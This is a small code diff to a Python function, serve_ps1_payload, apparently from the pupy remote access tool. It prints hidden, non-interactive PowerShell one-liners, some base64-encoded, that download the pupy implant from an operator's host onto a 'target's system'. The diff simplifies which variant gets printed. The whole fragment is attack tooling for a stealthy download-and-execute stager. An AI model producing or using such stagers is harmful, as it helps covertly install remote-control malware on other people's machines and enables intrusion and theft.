@@ -164,10 +164,7 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=Tr
                 b=b64encode(a.encode('UTF-16LE'))
             oneliner=colorize("powershell.exe -w hidden -noni -nop -enc %s"%b, "green")
             message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
-        if ssl:
-            print colorize("powershell.exe -w hidden -noni -nop -enc %s"%a, "green")
-        else:
-            print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
+        print colorize("powershell.exe -w hidden -noni -nop -c \"%s\""%a, "green")
         print " --- "
         print oneliner
         print " --- "
